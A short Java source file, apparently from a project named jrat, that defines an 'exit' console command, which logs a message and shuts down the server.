package net.jrat.core.command.commands;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.utils.Logger;

public class Exit extends Command
{
	public Exit()
	{
		super("exit", new String[0], new String[0], "system shutdown");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		Logger.log("shutting down...");
		this.server.shutdown();
	}
}